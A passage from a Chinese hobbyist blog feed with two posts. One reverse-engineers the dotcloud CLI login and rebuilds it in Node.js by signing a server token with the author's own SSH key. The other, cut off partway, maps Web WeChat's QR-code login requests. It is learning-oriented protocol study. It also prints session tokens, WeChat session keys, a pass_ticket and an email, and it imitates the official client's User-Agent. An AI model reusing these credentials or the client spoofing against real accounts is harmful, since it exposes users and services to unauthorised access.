<pre><code>ccssh signature=rqsolg<span class="regexp">/L43mTokqnwVCgfGpCxxxxxxxxxxxxxvsdv6HxXiyXkmEAg6kKvOHSjFhCprq2AuDQbU2Z7DHUcryu9bVRmBQvNOd2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/</span><span class="number">92</span>uN4C6aUkXqCmlp16G0VC2qqE<span class="regexp">/QrEuvO72OXeMC8tL4RrU3Qn7tRzablDo2sNaCXkXMcjMtqM+DpuzqbOHZnn7lEwynbCPOtRGaGYnVRQtxxxxxxxxxxxufi6oxomKGk/</span><span class="number">6</span>ch8C7yjEE9hfbbqFcXBZQw==,fingerprint=<span class="string">c6:</span><span class="string">xx:</span><span class="number">92</span>:<span class="number">8</span><span class="string">a:</span><span class="number">86</span>:<span class="string">xx:</span><span class="number">6</span><span class="string">b:</span><span class="string">af:</span><span class="string">fe:</span><span class="string">xx:</span><span class="number">19</span>:<span class="number">62</span>:<span class="number">1</span><span class="string">b:</span><span class="string">xx:</span><span class="number">2</span><span class="string">b:</span>f0,sshtoken=unBVe7F36pCfVhtZEmPCaT,email=xxx<span class="annotation">@linuxer</span>.me
</code></pre><p>虽然公钥和数据签名也没什么影响，还是打上码= =</p>
<p>sshtoken是第一步在response header中www-authenticate中给的，其他的呢。</p>
<p>email很显然。。fingerprint，我自己的太熟悉了。。signature是啥？</p>
<p>看了下源码，发现是<a href="https://github.com/cloudControl/cctrl/blob/c9e015920f52ca971d9dd6640f26b504d055f973/cctrl/keyhelpers.py#L212" target="_blank" rel="external">这个函数生成的signature</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature = sign_token(key_path, fingerprint, sshtoken)</span><br></pre></td></tr></table></figure>
<p>数据签名函数简化如下，把错误处理去掉了，还懒得管缩进。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def sign_token(key_path, fingerprint, data):&#10;    # from agent&#10;    pkey = get_key_from_agent(fingerprint)&#10;        # paramiko is inconsistent here in that the agent&#39;s key&#10;        # returns Message objects for &#39;sign_ssh_data&#39; whereas RSAKey&#10;        # objects returns byte strings.&#10;        # Workaround: cast both return values to string and build a&#10;        # new Message object&#10;        s = str(pkey.sign_ssh_data(data))&#10;        m = Message(s)&#10;        m.rewind()&#10;       m.get_string() # == &#39;ssh-rsa&#39;:&#10;        return base64.b64encode(m.get_string())</span><br></pre></td></tr></table></figure>
<p>于是自己查看文档试验了一下，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/tmp/dcwall] - [<span class="number">2016</span>-<span class="number">01</span>-<span class="number">23</span> <span class="number">01</span>:<span class="number">05</span>:<span class="number">51</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; ssh -v -t -p <span class="number">2222</span> -- wechat-default@sshforwarder.dotcloudapp.com TOKEN=tv8NczygRPK6cgp78azgXyKKrX9KPN bash </span><br><span class="line">OpenSSH_6.<span class="number">6.1</span>, OpenSSL <span class="number">1.0</span>.<span class="number">1</span>f <span class="number">6</span> Jan <span class="number">2014</span></span><br><span class="line">debug1: Reading configuration data /home/reverland/.ssh/config</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line <span class="number">19</span>: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to sshforwarder.dotcloudapp.com [<span class="number">130.211</span>.<span class="number">165.15</span>] port <span class="number">2222</span>.</span><br><span class="line">debug1: fd <span class="number">3</span> clearing O_NONBLOCK</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_rsa <span class="built_in">type</span> <span class="number">1</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_rsa-cert <span class="built_in">type</span> -<span class="number">1</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_dsa <span class="built_in">type</span> <span class="number">2</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_dsa-cert <span class="built_in">type</span> -<span class="number">1</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_ecdsa <span class="built_in">type</span> -<span class="number">1</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_ecdsa-cert <span class="built_in">type</span> -<span class="number">1</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_ed25519 <span class="built_in">type</span> -<span class="number">1</span></span><br><span class="line">debug1: identity file /home/reverland/.ssh/id_ed25519-cert <span class="built_in">type</span> -<span class="number">1</span></span><br><span class="line">debug1: Enabling compatibility mode <span class="keyword">for</span> protocol <span class="number">2.0</span></span><br><span class="line">debug1: Local version string SSH-<span class="number">2.0</span>-OpenSSH_6.<span class="number">6.1</span>p1 Ubuntu-<span class="number">2</span>ubuntu2.<span class="number">4</span></span><br><span class="line">debug1: Remote protocol version <span class="number">2.0</span>, remote software version Twisted</span><br><span class="line">debug1: no match: Twisted</span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: server-&gt;client aes128-ctr hmac-md5 none</span><br><span class="line">debug1: kex: client-&gt;server aes128-ctr hmac-md5 none</span><br><span class="line">debug1: SSH2_MSG_KEX_DH_GEX_REQUEST(<span class="number">1024</span>&lt;<span class="number">3072</span>&lt;<span class="number">8192</span>) sent</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP</span><br><span class="line">debug1: SSH2_MSG_KEX_DH_GEX_INIT sent</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY</span><br><span class="line">debug1: Server host key: RSA <span class="number">5</span>a:<span class="number">83</span>:<span class="number">13</span>:<span class="number">7</span>c:d7:a1:cb:<span class="number">7</span>c:ec:<span class="number">29</span>:<span class="number">99</span>:<span class="number">91</span>:e4:bc:<span class="number">9</span>d:<span class="number">01</span></span><br><span class="line">debug1: Host <span class="string">'[sshforwarder.dotcloudapp.com]:2222'</span> is known and matches the RSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /home/reverland/.ssh/known_hosts:<span class="number">3689</span></span><br><span class="line">debug1: ssh_rsa_verify: signature correct</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: SSH2_MSG_SERVICE_REQUEST sent</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering DSA public key: /home/reverland/.ssh/id_dsa</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey</span><br><span class="line">debug1: Offering RSA public key: /home/reverland/.ssh/id_rsa</span><br><span class="line">debug1: Server accepts key: pkalg ssh-rsa blen <span class="number">279</span></span><br><span class="line">debug1: Authentication succeeded (publickey).</span><br><span class="line">Authenticated to sshforwarder.dotcloudapp.com ([<span class="number">130.211</span>.<span class="number">165.15</span>]:<span class="number">2222</span>).</span><br><span class="line">debug1: channel <span class="number">0</span>: new [client-session]</span><br><span class="line">debug1: Entering interactive session.</span><br><span class="line">debug1: Sending environment.</span><br><span class="line">debug1: Sending env LC_IDENTIFICATION = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_TIME = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_NUMERIC = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_PAPER = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_MEASUREMENT = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_ADDRESS = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_MONETARY = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LANG = en_US.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_NAME = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_TELEPHONE = zh_CN.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending env LC_CTYPE = en_US.UTF-<span class="number">8</span></span><br><span class="line">debug1: Sending <span class="built_in">command</span>: TOKEN=tv8NczygRPK6cgp78azgXyKKrX9KPN bash</span><br><span class="line">Connecting...</span><br><span class="line">[wechat/default]:~$</span><br></pre></td></tr></table></figure>
<p>想了想这个认证过程。</p>
<ul>
<li>https请求服务器，得到sshtoken</li>
<li>用私钥给sshtoken的sha1哈希签名，连同公钥fingerprint，email，sshtoken一并发送给服务器</li>
<li>（这一步是我猜的）服务器验证fingerprint身份（之前dcuser时应该已经密码认证传过公钥，待验证），服务器使用客户公钥解密签名，将解密得到的哈希和sshtoken的sha1哈希进行对比，实现身份验证和sshtoken 验证。返回再下一步ssh连接时要传递的token</li>
<li>客户端ssh连接forward.dotcloudapp.com，认证通过后，服务器端需要检查Token的值来启动程序实例。为什么要检查呢？我猜，因为dotcloud免费用户控制只能运行一个Worker实例。。。</li>
</ul>
<p>于是，自己实现了下这个过程。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">'child_process'</span>).exec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>);</span><br><span class="line"><span class="keyword">var</span> EMAIL = <span class="string">'sa@linuxer.me'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getSshToken = <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject) =&gt; &#123;</span><br><span class="line">  <span class="keyword">var</span> req = https.request(&#123;</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    path: <span class="string">'/token/'</span>,</span><br><span class="line">    hostname: <span class="string">'api.dotcloudapp.com'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      <span class="string">'User-Agent'</span>: <span class="string">'pycclib/1.6.2'</span>,</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">      <span class="string">'Content-length'</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, (res)=&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'www-authenticate'</span> <span class="keyword">in</span> res.headers) &#123;</span><br><span class="line">      <span class="comment">//console.log(res.headers['www-authenticate']);</span></span><br><span class="line">      <span class="keyword">var</span> result = <span class="regexp">/sshtoken=(.+)$/mg</span>.exec(res.headers[<span class="string">'www-authenticate'</span>])</span><br><span class="line">      <span class="keyword">if</span> (!result) &#123;</span><br><span class="line">        reject(<span class="string">"fail to get ssh token"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> sshtoken = result[<span class="number">1</span>];</span><br><span class="line">      resolve(sshtoken);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  req.end();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAuth</span>(<span class="params">sshtoken</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> p1 = getSignature(sshtoken);</span><br><span class="line">  <span class="keyword">var</span> p2 = getFingerPrint();</span><br><span class="line">  <span class="keyword">var</span> p3 = <span class="built_in">Promise</span>.all([p1, p2]).then((k)=&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject)=&gt;&#123;</span><br><span class="line">      <span class="keyword">var</span> authorization = <span class="string">'ccssh '</span>;</span><br><span class="line">      authorization += (<span class="string">'signature='</span> + k[<span class="number">0</span>] + <span class="string">','</span>);</span><br><span class="line">      authorization += (<span class="string">'fingerprint='</span> + k[<span class="number">1</span>] + <span class="string">','</span>);</span><br><span class="line">      authorization += (<span class="string">'sshtoken='</span> + sshtoken + <span class="string">','</span>);</span><br><span class="line">      authorization += (<span class="string">'email='</span> + EMAIL);</span><br><span class="line">      <span class="built_in">console</span>.log(authorization);</span><br><span class="line">      resolve(authorization);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> p3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSignature</span>(<span class="params">sshtoken</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject)=&gt;&#123;</span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="string">'echo -ne "'</span> + sshtoken + <span class="string">'" | openssl sha1 -binary | openssl pkeyutl -sign -inkey ~/.ssh/id_rsa -pkeyopt digest:sha1'</span>;</span><br><span class="line">    <span class="comment">//console.log(cmd);</span></span><br><span class="line">    exec(cmd,</span><br><span class="line">         <span class="comment">// 以下两个参数非常重要</span></span><br><span class="line">         &#123;</span><br><span class="line">           encoding: <span class="string">'binary'</span>,</span><br><span class="line">           shell: <span class="string">'/bin/bash'</span>,</span><br><span class="line">         &#125;,</span><br><span class="line">         (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">           <span class="keyword">if</span> (error) &#123;</span><br><span class="line">             reject(error);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// 注意要binary而不是utf8</span></span><br><span class="line">           resolve(<span class="keyword">new</span> Buffer(stdout, <span class="string">'binary'</span>).toString(<span class="string">'base64'</span>));</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFingerPrint</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject)=&gt;&#123;</span><br><span class="line">    exec(<span class="string">'ssh-keygen -lf ~/.ssh/id_rsa.pub'</span>, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125;</span><br><span class="line">      resolve(stdout.toString().split(<span class="string">' '</span>)[<span class="number">1</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params">authorization</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>((resolve, reject)=&gt;&#123;</span><br><span class="line">    <span class="keyword">var</span> req = https.request(&#123;</span><br><span class="line">      method: <span class="string">'POST'</span>,</span><br><span class="line">      path: <span class="string">'/token/'</span>,</span><br><span class="line">      hostname: <span class="string">'api.dotcloudapp.com'</span>,</span><br><span class="line">      headers: &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'pycclib/1.6.2'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'Content-length'</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">'Authorization'</span>: authorization,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, (res)=&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (res.statusCode != <span class="number">200</span>) &#123;</span><br><span class="line">        reject(<span class="string">"fail to get token"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> data = <span class="string">''</span>;</span><br><span class="line">      res.on(<span class="string">'data'</span>, (chunk)=&gt;&#123;</span><br><span class="line">        data += chunk;</span><br><span class="line">      &#125;);</span><br><span class="line">      res.on(<span class="string">'end'</span>, ()=&gt;&#123;</span><br><span class="line">        resolve(data);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    req.end();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getSshToken.then(getAuth).then(getToken).then(<span class="built_in">console</span>.log).catch(<span class="built_in">console</span>.error);</span><br></pre></td></tr></table></figure>
<p>一点也不顺利：</p>
<p>我用的v5.0.0，看了看<a href="https://nodejs.org/docs/v5.0.0/api/child_process.html#child_process_child_process_exec_command_options_callback" target="_blank" rel="external">文档里赫然写着stderror是Buffer好么</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">callback Function called with the output when process terminates</span><br><span class="line"></span><br><span class="line">    error Error</span><br><span class="line">    stdout Buffer</span><br><span class="line">    stderr Buffer</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
<p><em style="color:red;">然而实际上怎么是String…..是我理解不对么？<em></em></em></p>
<p>其次，echo在/bin/sh和/bin/bash中不是一回事，一个是内置命令，一个是单独程序。。。</p>
<p>再次，深刻体会到该binary的时候一定得binary，字符串在我这里只能utf-8。。再Buffer后完全不是之前的binary数据。被坑得半死不活。</p>
<p>最后，Cheers</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[wechat/default]:~$ curl https://twitter.com | md5sum</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span> <span class="number">70740</span>  <span class="number">100</span> <span class="number">70740</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">219</span>k      <span class="number">0</span> --:--:-- --:--:-- --:--:--  <span class="number">262</span>k</span><br><span class="line"><span class="number">9</span>f9f288dbfb5fbf379244ed9a75f7ebf  -</span><br></pre></td></tr></table></figure>
<p>不过tunnel还是没成功，不过也不是为了tunnel不是。</p>
<h2 id="总结">总结</h2><p>Just for fun！</p>
<p>学习下dotcloud的cli认证原理</p>
<p>不知道heroku是不是类似的认证方式</p>
<p>我要好好研究下ssh forward原理。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>dotcloud悄无声息的远去了。我收到让转移应用的邮件才知道公司已经破产。</p>
<p>就在几天前，往dotcloud上部署微信机器人时还饶有兴趣瞎折腾了一下。当时发在<a href="https://cnodejs.org/topic/56a310f28dcd3e82]]>
    </summary>
    
      <category term="hack" scheme="http://reverland.org/tags/hack/"/>
    
      <category term="hack" scheme="http://reverland.org/categories/hack/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Web 微信与基于Node的微信机器人实现]]></title>
    <link href="http://reverland.org/javascript/2016/01/15/webchat-user-bot/"/>
    <id>http://reverland.org/javascript/2016/01/15/webchat-user-bot/</id>
    <published>2016-01-15T12:10:49.000Z</published>
    <updated>2016-03-07T12:28:08.145Z</updated>
    <content type="html"><![CDATA[<h2 id="协议分析">协议分析</h2><p>我使用firefox浏览器调试工具，查看浏览器通信及美化web微信javascript代码。非常好用，没出现Chromium中文乱码的问题。</p>
<h3 id="登录">登录</h3><h4 id="获取uuid">获取uuid</h4><p>与登录有关的第一个GET请求。</p>
<pre><code><span class="symbol">https:</span>/<span class="regexp">/login.weixin.qq.com/jslogin</span>?appid=wx782c26e4c19acffb&amp;redirect_uri=https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fwx.qq.com%<span class="number">2</span>Fcgi-bin%<span class="number">2</span>Fmmwebwx-bin%<span class="number">2</span>Fwebwxnewloginpage&amp;<span class="function"><span class="keyword">fun</span>=<span class="title">new</span></span>&amp;lang=en_US&amp;_=<span class="number">1452859503801</span>
</code></pre><p>响应</p>
<pre><code><span class="built_in">window</span>.QRLogin.code = <span class="number">200</span>; <span class="built_in">window</span>.QRLogin.uuid = <span class="string">"gd94hc3_fg=="</span>;
</code></pre><p>我们猜200表示OK，uuid表示什么呢，难道不是universe unique identy?</p>
<h4 id="获取uuid对应的二维码图片">获取uuid对应的二维码图片</h4><p>接着第二个GET请求，使用上面得到的uuid请求二维码图像。</p>
<pre><code><span class="string">https:</span><span class="comment">//login.weixin.qq.com/qrcode/gd94hc3_fg==</span>
</code></pre><p>响应就是一个二维码图片。</p>
<h4 id="检查二维码扫描状态">检查二维码扫描状态</h4><p>一个GET请求</p>
<pre><code><span class="keyword">https</span>://login.weixin.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=<span class="constant">true</span>&amp;<span class="built_in">uuid</span>=gd94hc3_fg==&amp;tip=<span class="number">0</span>&amp;r=-<span class="number">1160587432</span>&amp;_=<span class="number">1452859503803</span>
</code></pre><p>这里的参数r是时间戳(<code>~Date.now()</code>)，而<code>_</code>这个是jquery强行加上防止IE缓存的参数，服务器并不使用。服务器保持连接不中断，在大概27000ms后返回：</p>
<pre><code><span class="built_in">window</span>.code=<span class="number">408</span>;
</code></pre><p>HTTP code 408表示连接超时。接着又一个这种请求</p>
<pre><code><span class="keyword">https</span>://login.weixin.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=<span class="constant">true</span>&amp;<span class="built_in">uuid</span>=gd94hc3_fg==&amp;tip=<span class="number">0</span>&amp;r=-<span class="number">1160614525</span>&amp;_=<span class="number">1452859503804</span>
</code></pre><p>大概若干次后， 很久很久这个请求还是被服务器hold住没有返回。然后我再扫描时二维码失效了。。</p>
<p>如果在移动端扫描过二维码，那么上面的请求将返回</p>
<pre><code><span class="built_in">window</span>.code=<span class="number">201</span>;<span class="built_in">window</span>.userAvatar = <span class="string">'data:img/jpg;base64,/9j/4...'</span>
</code></pre><p>显然，http code 201一般表示新资源被建立(created)。同时继续另一个稍有不同的新的GET请求。</p>
<pre><code><span class="keyword">https</span>://login.weixin.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=<span class="constant">true</span>&amp;<span class="built_in">uuid</span>=gfKtKTG7EQ==&amp;tip=<span class="number">0</span>&amp;r=-<span class="number">1163246522</span>&amp;_=<span class="number">1452862177016</span>
</code></pre><p>注意，这时候tip变成0了。</p>
<p>移动端如果不确认登录，经过27000ms左右后依然返回</p>
<pre><code><span class="built_in">window</span>.code=<span class="number">408</span>;
</code></pre><p>因此可以确定大概408就是状态不变超时继续的意义。接下来继续上述GET请求。</p>
<p>一旦移动端点击确认登录，上述GET请求立马返回</p>
<pre><code><span class="built_in">window</span>.code=<span class="number">200</span>;
<span class="built_in">window</span>.redirect_uri=<span class="string">"https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxnewloginpage?ticket=Ac8jAIUKtSn5vBxlXAinpFXL@qrticket_0&amp;uuid=gd94hc3_fg==&amp;lang=en_US&amp;scan=1452862897"</span>;
</code></pre><p>scan参数就是<code>Date.now()</code>。这时一个重定向页面又参数中附加上了一个ticket，看到这里，Oauth五个大字从脑海中无名升起。下面，域名就变了。</p>
<h4 id="webwxnewloginpage">webwxnewloginpage</h4><p>接下来一个GET请求</p>
<pre><code><span class="string">https:</span><span class="comment">//wx.qq.com/cgi-bin/mmwebwx-bin/webwxinit?r=-1163944362&amp;lang=en_US&amp;pass_ticket=KlRMZmPcELxJHikrTsq6UEuDiy%252BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI</span>
</code></pre><p>返回这么个东西:</p>
<pre><code><span class="tag">&lt;<span class="title">error</span>&gt;</span><span class="tag">&lt;<span class="title">ret</span>&gt;</span>0<span class="tag">&lt;/<span class="title">ret</span>&gt;</span><span class="tag">&lt;<span class="title">message</span>&gt;</span>OK<span class="tag">&lt;/<span class="title">message</span>&gt;</span><span class="tag">&lt;<span class="title">skey</span>&gt;</span>@crypt_3bb2969_5d9682fbe6794c9437337ef278f6615c<span class="tag">&lt;/<span class="title">skey</span>&gt;</span><span class="tag">&lt;<span class="title">wxsid</span>&gt;</span>L9W0ddcaijmzhYhu<span class="tag">&lt;/<span class="title">wxsid</span>&gt;</span><span class="tag">&lt;<span class="title">wxuin</span>&gt;</span>2684027137<span class="tag">&lt;/<span class="title">wxuin</span>&gt;</span><span class="tag">&lt;<span class="title">pass_ticket</span>&gt;</span>KlRMZmPcELxJHikrTsq6UEuDiy%2BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI<span class="tag">&lt;/<span class="title">pass_ticket</span>&gt;</span><span class="tag">&lt;<span class="title">isgrayscale</span>&gt;</span>1<span class="tag">&lt;/<span class="title">isgrayscale</span>&gt;</span><span class="tag">&lt;/<span class="title">error</span>&gt;</span>
</code></pre><p>这些返回的参数</p>
<ul>
<li>skey: 我有点考据癖，发现<a href="http://www.feifeiboke.com/gongfang/2346.html" target="_blank" rel="external">qq空间也用这个东西</a>，维基百科说是一种一次性密码生成系统。大概这个值也是这么若干次哈希生成出来的。</li>
<li>wxsid: weixin session id</li>
<li>wxuin: weixin user identity number</li>
<li>pass_ticket: 通关文牒</li>
</ul>
<p>同时，返回的包头里包含<code>set-cookie</code>设置了cookie来标识用户。Cookie设置了上面的</p>
<ul>
<li>wxsid</li>
<li>wxuin</li>
</ul>
<p>另有</p>
<ul>
<li>wxloadtime: web微信页面加载时间。它是在计时并且不断汇报给服务器的。</li>
<li>mm_lang: 界面语言，我还想考证下mm什么意思然而并没有考证出来</li>
<li>webwx_data_ticket(这个域在qq.com上，其他都在wx.qq.com上)，不知道干什么用的，似乎标识用户资源信息时得用上。所有的用户资源比如图片音频什么的都在qq的域名上。（后面会讨论这个问题）</li>
</ul>
